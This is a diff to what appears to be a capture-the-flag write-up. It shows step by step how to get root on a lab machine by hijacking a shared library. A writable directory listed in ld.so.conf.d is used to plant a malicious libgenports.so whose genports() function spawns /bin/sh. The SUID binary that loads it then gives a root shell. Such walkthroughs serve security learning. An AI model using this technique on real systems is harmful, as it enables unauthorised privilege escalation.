@@ -98,7 +98,64 @@ There are a few things going on here. Our binary runs other processes:
  - server.go
  - server.js
 
+If you try to run /bin/kc, you'll understand that the process tree looks like this:
+```
+restart_servers
+├── ldconfig
+├── kc
+    └─ fuser
+├── server.py
+├── server.js
+└── server.go
+```
 
+Every call is made using the absolute path, so path injections won't be an option here.
+
+But `ldconfig` is a very good hint. It has probably something to do with shared libraries.
+
+```
+$ ldd /bin/kc
+	linux-vdso.so.1 (0x00007ffcb47e3000)
+	libgenports.so => /home/user1/servers/libs/libgenports.so (0x00007f32a91b0000)
+	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f32a8dbf000)
+	/lib64/ld-linux-x86-64.so.2 (0x00007f32a95b4000)
+```
+The `kc` binary (kill connection) uses a shared library `/home/user1/servers/libs/libgenports.so`. The folder `/home/user1/servers/libs/` is not writable by our current user.
+
+Let's find out, how `kc` knows where to look for the library. There are a few ways to indicate the location of a dynamic shared library. Some of then are using environment variables, like `LD_LIBRARY_PATH`. We have no indication that such variables are kept during our call at the SUID binary.
+
+Another way is to reference the path in `/etc/ld.so.conf`.
+
+```
+$ cat /etc/ld.so.conf
+include /etc/ld.so.conf.d/*.conf
+$ ls /etc/ld.so.conf.d/
+libc.conf  servers.conf  x86_64-linux-gnu.conf
+$ cat /etc/ld.so.conf.d/servers.conf 
+/home/user1/servers/libs/
+/home/user1/
+```
+So binaries will among other things look for the shared libraries in `/home/user1/servers/libs/` and `/home/user1/` folders. The second one is our home directory, so writable by us.
+
+Before writing the exploit, we need to figure out the name of the function that `kc` calls.
+
+A simple strings will to the job.
+```
+$ strings libgenports.so 
+__gmon_start__
+_init
+_fini
+_ITM_deregisterTMCloneTable
+_ITM_registerTMCloneTable
+__cxa_finalize
+genports <-----
+_edata
+__bss_start
+_end
+...
+```
+
+Let's write a generic library hijacking exploit...
 ```c
 #include <unistd.h>
 #include <stdio.h>
@@ -110,10 +167,25 @@ void genports() {
         execve("/bin/sh", 0, 0);
 }
 ```
-
+...and compile it.
 ```bash
 gcc -fPIC -shared -o libgenports.so exploit.c
-/etc/ld.so.conf.d/servers.conf
+```
+
+Last thing is to get rid of the legitimate library using the SUID rm binary.
+
+```
+$ servers/rm servers/libs/libgenports.so 
+```
+
+We don't have to worry about relinking, because `ldconfig`  is called as root when running `restart_servers`.
+
+```
+$ ./restart_servers 
+[*] Cleaning all ports
+[%] Running exploit
+# id
+uid=0(root) gid=1000(user1) groups=1000(user1)
 ```
 
 ### Flag
